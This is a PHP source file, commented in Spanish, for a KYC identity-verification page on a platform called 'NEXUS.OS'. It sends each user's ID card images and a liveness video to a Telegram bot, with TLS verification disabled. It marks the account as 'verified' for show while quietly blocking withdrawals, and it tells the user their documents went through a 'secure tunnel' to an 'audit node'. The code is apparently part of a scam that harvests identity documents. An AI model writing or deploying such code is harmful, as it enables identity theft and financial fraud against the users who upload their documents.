<?php
// public/kyc/upload_kyc.php
require '../../config.php'; // Ajusta según la ubicación real de tu config
session_start();

if (!isset($_SESSION['user_id'])) {
    header("Location: ../login.php");
    exit();
}

$user_id = $_SESSION['user_id'];

/**
 * Función para enviar archivos directamente desde la carpeta temporal de PHP
 */
function sendToTelegramFile($bot_token, $chat_id, $temp_path, $original_name, $caption) {
    if (!file_exists($temp_path)) return false;

    // Preparamos el archivo para CURL usando su nombre original para que Telegram reconozca la extensión
    $post_fields = [
        'chat_id'   => $chat_id,
        'document'  => new CURLFile($temp_path, mime_content_type($temp_path), $original_name),
        'caption'   => $caption,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init("https://api.telegram.org/bot$bot_token/sendDocument");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['ine_frente'])) {
    
    // Capturamos los datos de los archivos temporales
    $frente = $_FILES['ine_frente'];
    $atras  = $_FILES['ine_atras'];
    $video  = $_FILES['video_facial'];

    // Validamos que no haya errores de subida
    if ($frente['error'] === UPLOAD_ERR_OK && $atras['error'] === UPLOAD_ERR_OK && $video['error'] === UPLOAD_ERR_OK) {

        // 1. Notificación de Auditoría (Texto)
        $msg = "🛡️ **NEXUS.OS: ALERTA DE PRIVACIDAD**\n";
        $msg .= "---------------------------\n";
        $msg .= "👤 **ID USUARIO:** $user_id\n";
        $msg .= "🔐 **ESTADO:** Documentación enviada vía Túnel Seguro\n";
        $msg .= "🚫 **SISTEMA:** No se almacenaron copias locales.\n";
        
        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=".urlencode($msg)."&parse_mode=Markdown");

        // 2. Envío directo desde la memoria temporal a Telegram
        sendToTelegramFile($bot_token, $chat_id, $frente['tmp_name'], "u".$user_id."_frente.jpg", "📇 FRONTAL - ID: $user_id");
        sendToTelegramFile($bot_token, $chat_id, $atras['tmp_name'], "u".$user_id."_reverso.jpg", "📇 REVERSO - ID: $user_id");
        sendToTelegramFile($bot_token, $chat_id, $video['tmp_name'], "u".$user_id."_video.mp4", "🎥 PRUEBA DE VIDA - ID: $user_id");

        // 3. Actualización de Base de Datos
        // Marcamos verificado='si' para la estética del Dashboard y permiso_retiro=0 por seguridad
        $stmt = $conn->prepare("UPDATE usuarios SET verificado = 'si', permiso_retiro = 0 WHERE id = ?");
        $stmt->bind_param("i", $user_id);
        
        if ($stmt->execute()) {
            echo "<script>
                alert('¡TÚNEL SEGURO COMPLETADO! Tu identidad ha sido enviada al nodo de auditoría. Tu cuenta ahora es NIVEL GUERRERO.'); 
                window.location.href='../dashboard.php'; 
            </script>";
        }

    } else {
        echo "<script>alert('Error en la transferencia de archivos. Intenta de nuevo.'); window.location.href='upload_kyc.php';</script>";
    }
}
?>
